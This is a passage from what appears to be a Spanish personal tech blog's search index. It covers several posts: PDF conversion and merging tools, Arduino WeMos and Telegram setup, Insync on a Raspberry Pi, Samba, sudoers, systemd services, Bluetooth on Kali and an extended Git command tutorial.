unos pdf con bastantes caracteristicas interesantes.\nUna vez instalado con pulsar ctrl-shift-E o botón derecho \u0026gt; Markdown to PDF generaremos el pdf con el mismo nombre que el fichero.\nSe puede modificar el css, el pie de pagina y la cabecera resultante, los ficheros a modificar serian:\n~/.atom/markdown-themeable-pdf/styles.css ~/.atom/markdown-themeable-pdf/header.js ~/.atom/markdown-themeable-pdf/footer.js ACORDARME DE SUBIR MIS FICHEROS MODIFICADOS A CODE Portada Indice tabla de contenidos resaltado de sintaxis tablas markdown Separar por pagina distintos apartados Optimización del espacio Corta lineas de codigo largas ❌ ❌ ❌ ✔ ✔ ❌ ✔ ✔ Markdown Pad Markdown Pad es el único de todos los conversores que salen aquí que esta unicamente para Windows y que ademas es de pago, teniendo una versión gratuita bastante limitada.\nPONERLO CUANDO ESTE EN WINDOWS YA QUE NO SE PUEDE USAR EN LINUX Portada Indice tabla de contenidos resaltado de sintaxis tablas markdown Separar por pagina distintos apartados Optimizacion del espacio Corta lineas de codigo largas ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ Conversores Online Los conversores online están muy bien a la hora de generar un documento rápidamente, pero incorporan muchas menos características que el resto de conversores.\nCloudconvert url\nPortada Indice tabla de contenidos resaltado de sintaxis tablas markdown Separar por pagina distintos apartados Optimización del espacio Corta lineas de código largas ❌ ✔ ❌ ✔ ✔ ❌ ❌ ❌ Markdowntopdf Portada Indice tabla de contenidos resaltado de sintaxis tablas markdown Separar por pagina distintos apartados Optimización del espacio Corta lineas de código largas ❌ ❌ ❌ ❌ ✔ ❌ ✔ http://www.markdowntopdf.com/\nResumen general Programa Portada Indice tabla de contenidos resaltado de sintaxis tablas markdown Separar por pagina distintos apartados Optimización del espacio Corta lineas de código largas Pandoc ✔ ✔ ✔ ✔ ✔ ✔ ✔ ✔ Gimli ✔* ❌ ✔ ✔ ✔ ❌ ✔ ✔ Atom ❌ ❌ ❌ ✔ ✔ ❌ ✔ ✔ Markdown Pad ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ Cloudconvert ❌ ✔ ❌ ✔ ✔ ❌ ❌ ❌ Markdowntopdf ❌ ❌ ❌ ❌ ✔ ❌ ✔ ✔ * Puede generar una portada pero tiene que estar hecha en markdown y no suelen quedar muy bien visualmente.\nConclusión final Creo que en este caso la mejor opción es pandoc ya que es la único que puede hacer todo con un mínimo esfuerzo, como por ejemplo la portada y la toc.\n","date":"2017-01-27T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/markdown-to-pdf/","title":"markdown to pdf"},{"content":"http://valgrind.org/docs/manual/quick-start.html\n","date":"2016-12-25T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/calcular-consumo-c-con-valgrind/","title":"Calcular consumo c con valgrind"},{"content":"Introducción: Instalar la tarjeta esp8266 en el IDE de arduino para poder configurar una placa Wemos con la que tener un bot de telegram.\nRequisitos previos: Tener instalado Arduino IDE\nLinux: 1 2 3 4 5 #Fedora y derivadas sudo dnf install arduino #Debian y derivados sudo apt-get install arduino Resto:\nPagina oficial de arduino Instalación de la tarjeta ESP8266 En el IDE de arduino vamos a Archivo/Preferencias y añadimos una nueva tarjeta en el Gestor de URLs Adicionales de Tarjetas. La tarjeta que hay que añadir es:\nhttp://arduino.esp8266.com/stable/package_esp8266com_index.json\nPuede agregar varias URL, separándolas con comas.\nInstalamos la nueva placa, para eso vamos a Herramientas/Placa/Gestor de tarjetas y buscamos la placa esp8266 y le damos a instalar. Una vez instalada ya podemos seleccionar la placa y configurarla. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Seleccionamos la placa: WeMos D1 R2 \u0026amp; mini Upload Using: Serial – Use USB port on board to upload flash OTA – Use OTA to upload flash CPU Frequency: 80MHz 160MHz Flash Size: 4M (3M SPIFFS) – 3M File system size 4M (1M SPIFFS) – 1M File system size Upload Speed: 921600 bps – recommend Instalacion de los ejemplos de uso para la placa Wemos Nos descargamos el repositorio de ejemplos de Wemos (como un zip)\nRenombramos el zip como D1_mini_Examples\nEn Programa/Incluir librería/Añadir librería .ZIP seleccionamos la librería para que se importe y ya esta lista para ser usada.\nInstalación de la librería Universal Telegram Bot Library Descargar la librería Universal Telegram Bot Library\nAñadir la librería al IDE de arduino y ya la podremos usar\nIMPORTANTE: A la hora de hacer la conexión WIFI los ejemplos por defecto no funcionan correctamente\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 void bien() { Serial.begin(115200); WiFi.begin(SSID_WIFI, PASS_WIFI); //definidas en credentials.h while (WiFi.status() != WL_CONNECTED) { delay(500); Serial.print(\u0026#34;.\u0026#34;); } Serial.println(\u0026#34;WiFi conectado\u0026#34;); Serial.println(\u0026#34;IP address: \u0026#34;); Serial.println(WiFi.localIP()); } void mal() { Serial.begin(115200); while (WiFi.begin(ssid, password) != WL_CONNECTED) { Serial.print(\u0026#34;.\u0026#34;); delay(500); } Serial.println(\u0026#34;WiFi connected\u0026#34;); Serial.println(\u0026#34;IP address: \u0026#34;); IPAddress ip = WiFi.localIP(); Serial.println(ip); } ","date":"2016-09-06T00:00:00Z","image":"https://www.procamora.com/covers/programming.png","permalink":"https://www.procamora.com/p/uso-telegram-en-arduino-wemos/","title":"Uso telegram en Arduino WeMos"},{"content":"Para usar Insync desde la consola en Raspberry hay disponibles 2 compilaciones:\narmhf armel Lo primero es saber cual de las 2 versiones necesita, para ello tenemos dos opciones, ambas son leyendo\n1 2 3 readelf -A /proc/self/exe | grep Tag_ABI_VFP_args readelf -A /lib/arm-linux-gnueabihf/libc.so.6 | grep Tag_ABI_VFP_args Si obtenemos la linea Tag_ABI_VFP_args: VFP registers entonces es armhf, en caso de que no este la linea es armel.\nUna vez que hemos descargado la build que necesitamos, en mi caso armhf\n1 2 3 wget https://d2t3ff60b2tol4.cloudfront.net/test_builds/armhf/insync-armhf_1.3.17.36167_i386.tar.bz2 # or wget procamora.github.io/downloads/insync/insync-armhf_1.3.17.36167_i386.tar.bz2 Descomprimimos el fichero descargado:\n1 tar -xjf insync-armhf_1.3.17.36167_i386.tar.bz2 Accedemos al directorio que se ha creado e iniciamos el proceso:\n1 ./insync-portable start Nos pedirá que añadamos una nueva cuenta, para ello necesitamos un token de acceso a nuestra cuenta de google, esto se hace desde la siguiente url: https://insynchq.com/auth.\n1 ./insync-portable add_account --auth-code 34/P23489sd4sHp08785548ssssswf8s7df7sdflk_KLl33235s7d8a456 También se puede gestionar la cuenta para descargar solo las carpetas deseadas con:\n1 ./insync-portable manage_selective_sync mail@gmail.com Fuentes: 0, 1, 2\n","date":"2016-06-21T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/add-count-insync-portable-cli/","title":"Add count insync portable cli"},{"content":"Introducción: El objetivo es concatenar múltiples pdf en un único pdf, intentando mantener la estructura interna de los pdf a unir.\nPara hacer esto tenemos múltiples opciones:\nConcatenar por linea de comandos: pdfunite ImageMagick pdfjam Ghostscript Pad Concatenar con librerias externas: Python Concatenar Online: smallpdf Resumen general Conclusion final Concatenar por linea de comandos pdfunite ImageMagick pdfjam Ghostscript Pad Pdfunite Pdfunite es una herramienta muy simple excrita en ruby para unir pdf, se instala rápido, funciona bien pero el indice de los pdf se lo carga.\nInstalación. Solo hay que instalar el paquete poppler que lo contiene.\n1 dnf install poppler-utils Unión de pdf. Para unir varios pdf lo único que hay que hacer es pasárselos a pdfunite como argumento teniendo en cuenta que se irán añadiendo al pdf en el mismo orden y que el ultimo parámetro debe de ser el nombre del pdf resultante.\n1 pdfunite pdf1.pdf pdf2.pdf output.pdf Como inconveniente el indice que traigan otros pdf se lo carga.\nImageMagick (no recomendado) Este método funciona pero reduce la calidad (resolucion) del pdf un poco y aumenta bastante el tamaño del pdf resultante, su uso seria el siguiente:\n1 convert -density 300x300 -quality 100 pdf1.pdf pdf2.pdf output.pdf Pdfjam Pdfjam es un conjunto de pequeños script para hacer modificaciones a pdf, pero a nosotros la única herramienta que nos interesa ahora mismo es pdfjam que es la principal, ya que es la que usaremos para unir los pdf.\nInstalación. La Instalación en Fedora es simple, solo hay que instalar un paquete.\n1 [sudo] dnf install pdfjam Union de pdf. Para unir varios pdf lo único que hay que hacer es pasárselos a pdfjam como argumento teniendo en cuenta que se irán añadiendo al pdf en el mismo orden y que el pdf resultante debe ir precedido por un -o para indicar que es la salida.\n1 pdfjam pdf1.pdf pdf2.pdf -o output.pdf Como inconveniente el indice que traigan otros pdf se lo carga.\nGhostscript Ghostscript es un paquete que te permite ver o imprimir archivos PostScript y PDF en otros formatos o a partir de estos a otros formatos, pero a demás de todo eso también te permite unir archivos pdf. La instalación no es necesaria al menos en Fedora 24 ya que venia instalado por defecto.\nUnión de pdf. En este apartado al ser una herramienta bastante completa podríamos hacerlo de múltiples formas, antes de ponerla pondré algunos parámetros importantes que pasaremos a Ghostscript:\n-dBATCH: una vez que Ghostscript procesa los archivos PDF, debe salir. Si no incluye esta opción, Ghostscript seguirá ejecutándose. -dNOPAUSE: obliga a Ghostscript a procesar cada página sin pausar la interacción del usuario. -q: para que Ghostscript no muestre mensajes mientras funciona. -sDEVICE=pdfwrite: le dice a Ghostscript que use su escritor de PDF incorporado para procesar los archivos. -sOutputFile=output.pdf: le dice a Ghostscript que guarde el archivo PDF combinado con el nombre que especifico. Unir varios pdf. 1 gs -dBATCH -dNOPAUSE -q -sDEVICE=pdfwrite -sOutputFile=output.pdf pdf1.pdf pdf2.pdf Unir varios pdf haciendo una pequeña compresión. 1 gs -dBATCH -dNOPAUSE -q -sDEVICE=pdfwrite -dPDFSETTINGS=/prepress -sOutputFile=output.pdf pdf1.pdf pdf2.pdf Unir varios pdf haciendo una gran compresión, revisar porque puede haber perdidas de calidad visibles. 1 gs -dBATCH -dNOPAUSE -q -sDEVICE=pdfwrite -dPDFSETTINGS=/default -dCompatibilityLevel=1.4 -dQUIET -dDetectDuplicateImages -dCompressFonts=true -r150 -sOutputFile=output.pdf pdf1.pdf pdf2.pdf Fuentes: stackoverflow, linux.com\nConcatenar con librerías externas Python Python En python podemos usar la librería pyPdf2 que depende de la librería pdf. El resultado es un pdf con el nombre salida.pdf que tiene buena calidad pero no mantiene los indices\nIMPORTANTE: Actualizar el script para pasarle distintos argumentos como -o para hacerlo dinamico y que no tenga un fichero de salida statico\nInstalación. 1 [sudo] pip install pdf pyPdf2 Unir varios pdf. Uso: python concatena_pdf.py portada.pdf memoria.pdf\nDescargar script\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!/usr/bin/env python from pyPdf import PdfFileReader, PdfFileWriter import sys #Fuente: http://stackoverflow.com/questions/3444645/merge-pdf-files # Creating a routine that appends files to the output file def append_pdf(input,output): [output.addPage(input.getPage(page_num)) for page_num in range(input.numPages)] if len(sys.argv) == 3: # Creating an object where pdf pages are appended to output = PdfFileWriter() # Appending two pdf-pages from two different files for pdf in sys.argv[1:]: append_pdf(PdfFileReader(file(pdf,\u0026#34;rb\u0026#34;)),output) # Writing all the collected pages to a file output.write(open(\u0026#34;salida.pdf\u0026#34;,\u0026#34;wb\u0026#34;)) Concatenar Online smallpdf Smallpdf Smallpdf es una pagina online en la que podemos hacer múltiples operaciones con pdf como unirlos, separarlos y convertirlos a múltiples formatos, funciona bastante bien pero supongo que tendrá limitaciones en cuanto al tamaño de los ficheros y el numero máximo de operaciones a hacer con una cuenta gratis/sin registrar.\nResumen general herramienta mantiene integridad del indice calidad resultante pdfunite ❌ ✔ ImageMagick ❌ ❌ pdfjam ❌ ✔ Ghostscript ✔ ✔ pyPdf2 ❌ ✔ smallpdf ❌ ✔ Conclusión final Creo que en este caso la mejor opción es Ghostscript ya que es la unica que mantiene el indice después de la unión.\nFuente: 0, 1\n","date":"2016-05-11T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/concatenar-pdf/","title":"Concatenar pdf"},{"content":"###Crear usuario sudo useradd -s /bin/true username\n###Asignarle contraseña\n1 2 sudo smbpasswd -L -a username sudo smbpasswd -L -e username ###Listar usuarios samba\n1 sudo pdbedit -L -v testparm /etc/samba/smb.conf\n","date":"2016-04-22T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/usos-de-samba/","title":"Usos de samba"},{"content":" 1 2 3 llows members of the users group to mount and unmount the ## cdrom as root %users ALL=/sbin/mount /mnt/cdrom, /sbin/umount /mnt/cdrom http://www.cyberciti.biz/tips/allow-a-normal-user-to-run-commands-as-root.html\n","date":"2016-04-20T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/permitir-ciertos-comandos-sudo-como-usuario-normal/","title":"Permitir ciertos comandos sudo como usuario normal"},{"content":"http://unix.stackexchange.com/questions/970/how-to-associate-the-fedora-start-menu-with-the-windows-keyboard\n","date":"2016-04-19T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/usar-tecla-windows-como-para-abrir-menu/","title":"Usar tecla windows como para abrir menu"},{"content":"Paso 1: Crear el fichero del servicio. 1 sudo vim /lib/systemd/system/myscript.service Paso 2: Añadir el contenido al fichero. 1 2 3 4 5 6 7 8 9 10 11 [Unit] Description=My Script Service After=multi-user.target [Service] Type=idle ExecStart=/usr/bin/python3 /home/pi/myscript.py \u0026gt; /home/pi/myscript.log 2\u0026gt;\u0026amp;1 User=pi [Install] WantedBy=multi-user.target Paso 3: Poner los permisos necesarios al fichero. 1 sudo chmod 644 /lib/systemd/system/myscript.service Paso 4: Configurar systemd. 1 2 sudo systemctl daemon-reload sudo systemctl enable myscript.service Paso 5: Reiniciar el sistema. 1 sudo reboot Paso 6: Confirmar que el servicio esta funcionando. 1 sudo systemctl status myscript.service Fuentes: raspberrypi archlinux\n","date":"2016-03-24T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/autorun-script-linux-systemd/","title":"autorun script linux systemd"},{"content":"Primeros instalamos la librería para gestionar el bluetooth con pulseaudio sudo apt-get install pulseaudio-module-bluetooth\nIniciamos el servicio de bluetooth\n/etc/init.d/bluetooth start\nfoto\nPara poder activarlo en la configuración n hay que activar el modulo sudo pactl load-module module-bluetooth-discover\ndespués vamos a configuración de sonido y establecemos que el sonido salga por el casco en vez de por el altavoz\nfoto\n","date":"2016-02-23T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/cascos-bluetooth-en-kali/","title":"Cascos bluetooth en Kali"},{"content":"Introducción: Git es un software de control de versiones diseñado por Linus Torvalds, pensando en la eficiencia y la confiabilidad del mantenimiento de versiones de aplicaciones cuando éstas tienen un gran número de archivos de código fuente.\nExisten una serie de buenas practicas que son: Cada desarrollador o equipo de desarrollo puede hacer uso de Git de la forma que le parezca conveniente. Sin embargo una buena práctica es la siguiente: Se deben utilizar 4 tipos de ramas: Master, Development, Features, y Hotfix.\nMaster: Es la rama principal. Contiene el repositorio que se encuentra publicado en producción, por lo que debe estar siempre estable.\nDevelopment: Es una rama sacada de master. Es la rama de integración, todas las nuevas funcionalidades se deben integrar en esta rama. Luego que se realice la integración y se corrijan los errores (en caso de haber alguno), es decir que la rama se encuentre estable, se puede hacer un merge de development sobre la rama master.\nFeatures: Cada nueva funcionalidad se debe realizar en una rama nueva, específica para esa funcionalidad. Estas se deben sacar de development. Una vez que la funcionalidad esté pronta, se hace un merge de la rama sobre development, donde se integrará con las demás funcionalidades.\nHotfix: Son bugs que surgen en producción, por lo que se deben arreglar y publicar de forma urgente. Es por ello, que son ramas sacadas de master. Una vez corregido el error, se debe hacer un merge de la rama sobre master. Al final, para que no quede desactualizada, se debe realizar el merge de master sobre development.\nLas ordenes básicas que tiene son:\nOperaciones básicas: Manejo de ramas: Ramas locales Ramas remotas Manejo de submodulos: Duplicar un repositorio: Operaciones básicas Una vez que tienes git instalado y listo para usarse podremos usar los siguientes comandos:\nInicializando un repositorio en un directorio existente Si tenemos un repositorio con codigo y queremos crear un repositio git tendremos que escribir:\n1 $ git init Esto crea un nuevo subdirectorio llamado .git que contiene todos los archivos necesarios del repositorio, un esqueleto de un repositorio Git. Todavía no hay nada en tu proyecto que esté bajo seguimiento.\nAñadir archivos Para empezar a seguir las modificaciones de un fichero habra que usar el comando git add fichero y comenzaremos a trackear el archivo \u0026ldquo;nombre_archivo\u0026rdquo;.\n1 $ git add \u0026lt;nombre_archivo\u0026gt; Si tenemos multiples ficheros y no queremos añadirlos uno a uno podremos hacerlos todos juntos con:\n1 $ git add . Confirmar los cambios Para consolidar el archivo previamente creado y puesto en escenario debemos utilizar el siguiente comando:\n1 $ git commit –m \u0026#39;versión inicial del proyecto\u0026#39; La bandera -m indica que se debe consolidar el archivo con un mensaje informativo.\nEnviar cambios al servidor Una vez que tenemos los cambios consolidados en nuestro repositorio local, utilizamos el comando git push para enviarlo al servidor:\n1 $ git push origin master clonacion de un repositorio Si queremos tener una copia local de un repositorio, el comando que usaremos es git clone [url], tendremos distintas formas de clonar:\nClonacion de un repositorio\n1 git clone git@github.com:procamora/Wiki-Pelican.git Clonacion de un repositorio especificando su nombre\n1 git clone git@github.com:procamora/Wiki-Pelican.git wiki Clonacion recursiva con submodulos:\n1 git clone --recursive git@github.com:procamora/Wiki-Pelican.git Recuerda que puedes clonar un repositorio por ssh o por https, la diferencia esta en que por ssh no tendras que autenticarte cada vez que realizas un cambio en el servidor.\nver estado del respositorio Muestra el estado actual de la rama, como los cambios que hay sin commitear.\nSi esta todo correcto y no hay ningun cambio la salida sera:\n1 2 3 $ git status On branch master nothing to commit, working directory clean Si hay modificaciones pendientes\n1 2 3 4 5 6 $ git status On branch master Untracked files: #\u0026lt;-- Nos está indicando que tenemos archivos nuevos. (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to include in what will be committed) Archivo2.txt #\u0026lt;-- El archivo nuevo del que git no conoce. nothing added to commit but untracked files present (use \u0026#34;git add\u0026#34; to track) comparar diferencias Cuando queremos ver las lineas añadidas y eliminadas de un fichero modificado usaremos:\n1 git diff fichero Si quieres ver los cambios que has preparado y que irán en tu próxima confirmación, puedes usar:\n1 git diff –-cached. Eliminando archivos Para eliminar un archivo de Git, debes eliminarlo de tus archivos bajo seguimiento (más concretamente, debes eliminarlo de tu área de preparación), y después confirmar. El comando git rm se encarga de eso, y también elimina el archivo de tu directorio de trabajo, para que no lo veas entre los archivos sin seguimiento.\nSi simplemente eliminas el archivo de tu directorio de trabajo, aparecerá bajo la cabecera “Modificados pero no actualizados” (“Changed but not updated”) (es decir, sin preparar) de la salida del comando git status:\n1 2 3 4 5 6 7 8 9 $ rm grit.gemspec $ git status # On branch master # # Changed but not updated: # (use \u0026#34;git add/rm \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) # # deleted: grit.gemspec # Si entonces ejecutas el comando git rm, preparas la eliminación del archivo en cuestión:\n1 2 3 4 5 6 7 8 9 10 $ git rm grit.gemspec rm \u0026#39;grit.gemspec\u0026#39; $ git status # On branch master # # Changes to be committed: # (use \u0026#34;git reset HEAD \u0026lt;file\u0026gt;...\u0026#34; to unstage) # # deleted: grit.gemspec # La próxima vez que confirmes, el archivo desaparecerá y dejará de estar bajo seguimiento. Si ya habías modificado el archivo y lo tenías en el área de preparación, deberás forzar su eliminación con la opción -f.\nMoviendo archivos A diferencia de muchos otros VCSs, Git no hace un seguimiento explicito del movimiento de archivos. Si renombras un archivo, en Git no se almacena ningún metadato que indique que lo has renombrado. Sin embargo, Git es suficientemente inteligente como para darse cuenta — trataremos el tema de la detección de movimiento de archivos un poco más adelante —.\nPor tanto, es un poco desconcertante que Git tenga un comando mv. Si quieres renombrar un archivo en Git, puedes ejecutar algo así:\n1 $ git mv README.txt README Sin embargo, esto es equivalente a ejecutar algo así:\n1 2 3 $ mv README.txt README $ git rm README.txt $ git add README git log (multiples vistas) Después de haber hecho varias confirmaciones, o si has clonado un repositorio que ya tenía un histórico de confirmaciones, probablemente quieras mirar atrás para ver qué modificaciones se han llevado a cabo. La herramienta más básica y potente para hacer esto es el comando git log.\nPor defecto, si no pasas ningún argumento, git log lista las confirmaciones hechas sobre ese repositorio en orden cronológico inverso. Es decir, las confirmaciones más recientes se muestran al principio. Como puedes ver, este comando lista cada confirmación con su suma de comprobación SHA-1, el nombre y dirección de correo del autor, la fecha y el mensaje de confirmación git log\nUna de las opciones más útiles es -p, que muestra las diferencias introducidas en cada confirmación. También puedes usar la opción -2, que hace que se muestren únicamente las dos últimas entradas del histórico git log -p -2.\nTambién puedes usar con git log una serie de opciones de resumen. Por ejemplo, si quieres ver algunas estadísticas de cada confirmación, puedes usar la opción \u0026ndash;stat git log --stat.\nModificando tu última confirmación Frecuentemente cuando trabajamos y consolidamos los cambios olvidamos agregar al escenario algún archivo o simplemente lo modificamos tarde y lo queremos agregar a la información consolidada anteriormente. Es aquí cuando entra este comando en acción.\nVamos a realizar una serie de cambios, los consolidaremos y agregaremos otro cambio posteriormente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ touch README.md $ echo \u0026#39;# Repositorio git para el curso Git desde cero\u0026#39; \u0026gt;\u0026gt; README.md $ git status # omitimos la salida $ git add README.md $ git commit -m \u0026#34;Agregar archivo README.md\u0026#34; # Ahora modificaremos otro archivo y lo agregaremos. $ echo \u0026#39;Agregamos la tercera linea\u0026#39; \u0026gt;\u0026gt; Archivo2_cambio_de_nombre.txt $ git add Archivo2_cambio_de_nombre.txt # En este punto tenemos dos opciones 1) Dejar el mismo mensaje 2) Cambiarlo $ git commit --amend --no-edit # Dejamos el mismo mensaje $ git commit --amend -m \u0026#34;Nuevo mensaje para el cambio\u0026#34; Es sumamente importante que si los cambios fueron consolidados y enviados al servidor remoto NO se utilice este comando; ya que se modifica el número de serial único de los cambios hechos y vamos a tener un conflicto difícil de resolver.\nDeshaciendo la preparación de un archivo Cuando añadimos al escenario un archivo por error, o hacemos un git add . cuando no queriamos añadir todos los ficheros con modificaciones tendremos el comodin de eliminar del escenario un fichero o todos con git reset\nSu funcionamiento es el siguiente: Añadimos todos los ficheros modificados y desacemos el add. git reset HEAD\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ git add . # añadimos todos los ficheros $ git status # mostramos el estado actual On branch master Your branch is up-to-date with \u0026#39;origin/master\u0026#39;. Changes to be committed: (use \u0026#34;git reset HEAD \u0026lt;file\u0026gt;...\u0026#34; to unstage) modified: README.md new file: prueba $ git reset HEAD # cancelamos el comando add Unstaged changes after reset: M README.md $ git status # mostramos el estado actual On branch master Your branch is up-to-date with \u0026#39;origin/master\u0026#39;. Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git checkout -- \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: README.md Untracked files: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to include in what will be committed) prueba no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) Su funcionamiento es el siguiente: Añadimos un fichero y desacemos el add de ese unico fichero. git reset HEAD \u0026lt;archivo\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $ git add prueba # añadimos el fichero prueba $ git status # mostramos el estado actual On branch master Your branch is up-to-date with \u0026#39;origin/master\u0026#39;. Changes to be committed: (use \u0026#34;git reset HEAD \u0026lt;file\u0026gt;...\u0026#34; to unstage) new file: prueba Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git checkout -- \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: README.md $ git reset HEAD prueba # cancelamos el comando add para prueba Unstaged changes after reset: M README.md $ git status # mostramos el estado actual On branch master Your branch is up-to-date with \u0026#39;origin/master\u0026#39;. Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git checkout -- \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: README.md Untracked files: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to include in what will be committed) prueba no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) Deshaciendo la modificación de un archivo Si queremos desechar todos los cambios que hemos hecho a un fichero desde el ultimo commit tendremos la opcion git checkout fichero\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ git status On branch master Your branch is up-to-date with \u0026#39;origin/master\u0026#39;. Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git checkout -- \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: README.md no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) $ git checkout README.md $ git status On branch master Your branch is up-to-date with \u0026#39;origin/master\u0026#39;. nothing to commit, working directory clean Mostrando tus repositorios remotos Para ver qué repositorios remotos tienes configurados, puedes ejecutar el comando git remote. Mostrará una lista con los nombres de los remotos que hayas especificado. Si has clonado tu repositorio, deberías ver por lo menos \u0026ldquo;origin\u0026rdquo; (es el nombre predeterminado que le da Git al servidor del que clonaste):\n1 2 $ git remote origin También puedes añadir la opción -v, que muestra la URL asociada a cada repositorio remoto:\n1 2 3 $ git remote -v origin git@github.com:procamora/Wiki-Personal.git (fetch) origin git@github.com:procamora/Wiki-Personal.git (push) Añadiendo repositorios remotos Para añadir un nuevo repositorio Git remoto, asignándole un nombre con el que referenciarlo fácilmente, ejecuta git remote add [nombre] [url]:\n1 git remote add wiki git://github.com/procamora/Wiki-Personal.git Recibiendo de tus repositorios remotos Para recuperar datos de los repositorios remotos usamos git fetch [remote-name], aunque normalmente el nombre del repositoio lo podremos saltar ya que solo tendremos uno.\nEste comando recupera todos los datos del proyecto remoto que no tengas todavía. Después de hacer esto, deberías tener referencias a todas las ramas del repositorio remoto, que puedes unir o inspeccionar en cualquier momento.\n1 $ git fetch Enviando a tus repositorios remotos Cuando tu proyecto se encuentra en un estado que quieres compartir, tienes que enviarlo a un repositorio remoto. El comando que te permite hacer esto es sencillo: git push [nombre-remoto][nombre-rama]. Si quieres enviar tu rama maestra (master) a tu servidor origen (origin), ejecutarías esto para enviar tu trabajo al servidor:\n1 $ git push origin master Este comando funciona únicamente si has clonado de un servidor en el que tienes permiso de escritura, y nadie ha enviado información mientras tanto. Si tú y otra persona clonais a la vez, y él envía su información y luego envías tú la tuya, tu envío será rechazado. Tendrás que bajarte primero su trabajo e incorporarlo en el tuyo para que se te permita hacer un envío.\nRecibiendo de tus repositorios remotos y actualizando los ficheros Éste comando es muy similar a git fetch aunque realiza dos funciones simultáneas, git pull realiza un git fetch más un git merge. Se descarga los cambios que se encuentren en el repositorio remoto y los unifica con los cambios que tengamos en nuestro equipo.\nnota: utilizando este comando puede que ocurran conflictos.\n1 $ git pull git tag (multiples formatos) Git usa dos tipos principales de etiquetas: ligeras y anotadas. Una etiqueta ligera es muy parecida a una rama que no cambia — un puntero a una confirmación específica —. Sin embargo, las etiquetas anotadas son almacenadas como objetos completos en la base de datos de Git. Tienen suma de comprobación; contienen el nombre del etiquetador, correo electrónico y fecha; tienen mensaje de etiquetado; y pueden estar firmadas y verificadas con GNU Privacy Guard (GPG). Generalmente se recomienda crear etiquetas anotadas para disponer de toda esta información; pero si por alguna razón quieres una etiqueta temporal y no quieres almacenar el resto de información, también tiene disponibles las etiquetas ligeras.\nEtiquetas anotadas Crear una etiqueta anotada en Git es simple. La forma más fácil es especificar -a al ejecutar el comando tag.\nEl parámetro -m especifica el mensaje, el cual se almacena con la etiqueta. Si no se especifica un mensaje para la etiqueta anotada, Git lanza tu editor para poder escribirlo.\n1 2 3 4 5 $ git tag -a v1.4 -m \u0026#39;my version 1.4\u0026#39; $ git tag v0.1 v1.3 v1.4 Puedes ver los datos de la etiqueta junto con la confirmación que fue etiquetada usando el comando git show:\n1 2 3 4 5 6 7 8 9 10 11 12 $ git show v1.4 tag v1.4 Tagger: Scott Chacon \u0026lt;schacon@gee-mail.com\u0026gt; Date: Mon Feb 9 14:45:11 2009 -0800 my version 1.4 commit 15027957951b64cf874c3557a0f3547bd83b3ff6 Merge: 4a447f7... a6b4c97... Author: Scott Chacon \u0026lt;schacon@gee-mail.com\u0026gt; Date: Sun Feb 8 19:02:46 2009 -0800 Merge branch \u0026#39;experiment\u0026#39; Esto muestra la información del autor de la etiqueta, la fecha en la que la confirmación fue etiquetada, y el mensaje de anotación antes de mostrar la información de la confirmación.\nUna vez que hayamos creado nuevos tags y queramos compartirlos con el repositorio remoto sólo debemos emplear el comando push con la bandera \u0026ndash;tags de la siguiente manera:\n1 2 3 4 $ git push origin master --tags Total 0 (delta 0), reused 0 (delta 0) To git@github.com:procamora/Wiki-Personal.git * [new tag] v1.4 -\u0026gt; v1.4 Etiquetas ligeras Otra forma de etiquetar confirmaciones es con una etiqueta ligera. Esto es básicamente la suma de comprobación de la confirmación almacenada en un archivo (ninguna otra información es guardada). Para crear una etiqueta ligera no añadas las opciones -a, -s o -m:\n1 2 3 4 5 6 7 $ git tag v1.4-lw $ git tag v0.1 v1.3 v1.4 v1.4-lw v1.5 Esta vez, si ejecutas el comando git show en la etiqueta, no verás ninguna información extra. El comando simplemente muestra la confirmación.\n1 2 3 4 5 6 7 $ git show v1.4-lw commit 15027957951b64cf874c3557a0f3547bd83b3ff6 Merge: 4a447f7... a6b4c97... Author: Scott Chacon \u0026lt;schacon@gee-mail.com\u0026gt; Date: 